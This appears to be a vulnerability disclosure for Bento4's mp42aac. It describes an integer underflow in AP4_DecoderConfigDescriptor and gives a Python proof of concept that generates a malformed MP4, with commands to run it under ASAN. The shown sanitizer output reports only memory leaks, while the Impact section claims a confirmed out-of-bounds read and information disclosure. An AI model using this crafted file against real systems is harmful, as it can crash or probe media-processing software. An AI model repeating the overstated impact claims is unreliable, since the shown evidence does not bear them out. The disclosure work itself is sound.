## Bug0: AP4_DecoderConfigDescriptor uint32 underflow creates unbounded SubStream leading to out-of-bounds read

In `AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor()` in `Ap4DecoderConfigDescriptor.cpp` (line 92), no check is performed to ensure `payload_size >= 13` before computing `payload_size - 13` as an unsigned `AP4_Size`, so a crafted descriptor with `payload_size < 13` causes an integer underflow that creates an approximately 4 GB `AP4_SubStream` and allows the descriptor factory loop to read file bytes far beyond the declared descriptor boundary.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct, os

OUTPUT_PATH = "poc_input.mp4"

def box(t: str, payload: bytes) -> bytes:
    return struct.pack(">I", 8 + len(payload)) + t.encode() + payload

def full_box(t: str, version: int, flags: int, payload: bytes) -> bytes:
    hdr = bytes([version, (flags >> 16) & 0xFF, (flags >> 8) & 0xFF, flags & 0xFF])
    return box(t, hdr + payload)

def desc(tag: int, payload: bytes) -> bytes:
    size = len(payload)
    assert size < 0x80
    return bytes([tag, size]) + payload

ftyp = box("ftyp", b"mp42" + struct.pack(">I", 0) + b"mp42" + b"isom")

MATRIX = struct.pack(">9I",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)

mvhd_payload = (
    b"\x00\x00\x00\x00"
    + struct.pack(">II", 0, 0)
    + struct.pack(">I", 44100)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0x00010000)
    + struct.pack(">H", 0x0100)
    + b"\x00" * 10
    + MATRIX
    + b"\x00" * 24
    + struct.pack(">I", 2)
)
assert len(mvhd_payload) == 100
mvhd = box("mvhd", mvhd_payload)

tkhd_payload = (
    b"\x00\x00\x00\x03"
    + struct.pack(">II", 0, 0)
    + struct.pack(">I", 1)
    + b"\x00" * 4
    + struct.pack(">I", 0)
    + b"\x00" * 8
    + struct.pack(">HH", 0, 0)
    + struct.pack(">H", 0x0100)
    + b"\x00" * 2
    + MATRIX
    + struct.pack(">II", 0, 0)
)
assert len(tkhd_payload) == 84
tkhd = box("tkhd", tkhd_payload)

mdhd_payload = (
    b"\x00\x00\x00\x00"
    + struct.pack(">II", 0, 0)
    + struct.pack(">I", 44100)
    + struct.pack(">I", 0)
    + struct.pack(">HH", 0x15C7, 0)
)
assert len(mdhd_payload) == 24
mdhd = box("mdhd", mdhd_payload)

hdlr_payload = (
    b"\x00\x00\x00\x00"
    + b"\x00" * 4
    + b"soun"
    + b"\x00" * 12
    + b"SoundHandler\x00"
)
hdlr = box("hdlr", hdlr_payload)

smhd = box("smhd", b"\x00\x00\x00\x00" + b"\x00" * 4)

url_payload = b"\x00\x00\x00\x01"
url_box = box("url ", url_payload)
dref_payload = b"\x00\x00\x00\x00" + struct.pack(">I", 1) + url_box
dref = box("dref", dref_payload)
dinf = box("dinf", dref)

# Variant A: ES payload=19, DC payload=12 -> underflow 12-13=0xFFFFFFFF
dc_a_payload = struct.pack(">BB", 0x40, 0x15) + b"\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00"
assert len(dc_a_payload) == 12
dc_a = desc(0x04, dc_a_payload)
extra_a = b"\xAA\xBB"
es_a_inner = struct.pack(">H", 0x0001) + b"\x00" + dc_a + extra_a
assert len(es_a_inner) == 19
es_a = desc(0x03, es_a_inner)
esds_a = box("esds", b"\x00\x00\x00\x00" + es_a)

# Variant B: ES payload=20, DC payload=0 -> underflow 0-13=0xFFFFFFF3
dc_b = desc(0x04, b"")
extra_b_for_dc_reads = struct.pack(">BB", 0x40, 0x15) + b"\x00" * 11
extra_b_for_substream = b"\xCC\xDD"
es_b_inner = struct.pack(">H", 0x0001) + b"\x00" + dc_b + extra_b_for_dc_reads + extra_b_for_substream
assert len(es_b_inner) == 20
es_b = desc(0x03, es_b_inner)
esds_b = box("esds", b"\x00\x00\x00\x00" + es_b)

# Variant C: DC directly in esds (raw file stream), DC payload=12
dc_c_payload = struct.pack(">BB", 0x40, 0x15) + b"\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00"
assert len(dc_c_payload) == 12
dc_c = desc(0x04, dc_c_payload)
esds_c = box("esds", b"\x00\x00\x00\x00" + dc_c)

def mp4a_entry(esds_box: bytes) -> bytes:
    mp4a_inner = (
        b"\x00" * 6
        + struct.pack(">H", 1)
        + b"\x00" * 8
        + struct.pack(">HH", 2, 16)
        + b"\x00\x00"
        + b"\x00\x00"
        + struct.pack(">I", 44100 << 16)
        + esds_box
    )
    return box("mp4a", mp4a_inner)

mp4a_a = mp4a_entry(esds_a)
mp4a_b = mp4a_entry(esds_b)
mp4a_c = mp4a_entry(esds_c)

stsd_payload = (
    b"\x00\x00\x00\x00"
    + struct.pack(">I", 3)
    + mp4a_a + mp4a_b + mp4a_c
)
stsd = box("stsd", stsd_payload)

stts = box("stts", b"\x00\x00\x00\x00" + struct.pack(">I", 0))
stsc = box("stsc", b"\x00\x00\x00\x00" + struct.pack(">I", 0))
stsz = box("stsz", b"\x00\x00\x00\x00" + struct.pack(">II", 0, 0))
stco = box("stco", b"\x00\x00\x00\x00" + struct.pack(">I", 0))

stbl = box("stbl", stsd + stts + stsc + stsz + stco)
minf = box("minf", smhd + dinf + stbl)
mdia = box("mdia", mdhd + hdlr + minf)
trak = box("trak", tkhd + mdia)
moov = box("moov", mvhd + trak)

mp4_data = ftyp + moov
with open(OUTPUT_PATH, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_PATH}")
print("    Variant A: ES payload=19, DC payload=12 -> underflow 0xFFFFFFFF")
print("    Variant B: ES payload=20, DC payload=0  -> underflow 0xFFFFFFF3")
print("    Variant C: DC directly in esds, payload=12 -> raw file stream OOB")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: LeakSanitizer: detected memory leaks
Indirect leak of 88 byte(s) in 1 object(s) allocated from:
    #0 in operator new(unsigned long) asan_new_delete.cpp:99
    #1 in AP4_DescriptorFactory::CreateDescriptorFromStream(AP4_ByteStream&, AP4_Descriptor*&) mp42aac+0xac6ea9
    #2 in AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor(AP4_ByteStream&, unsigned int, unsigned int) mp42aac+0xac114d
SUMMARY: AddressSanitizer: 265 byte(s) leaked in 6 allocation(s).

### Impact

An attacker who supplies a crafted MP4 file with a `DecoderConfig` descriptor whose declared `payload_size` is less than 13 causes an unsigned integer underflow in `AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor()`, resulting in an approximately 4 GB `AP4_SubStream` through which the descriptor factory reads and interprets file bytes far outside the declared descriptor boundary. The out-of-bounds read allows arbitrary file content to be parsed as MPEG-4 descriptors, confirmed by ASAN to produce object allocations from attacker-controlled bytes, enabling information disclosure and denial of service. Any invocation of `mp42aac` on an untrusted MP4 file exercises this path with no additional privileges required.
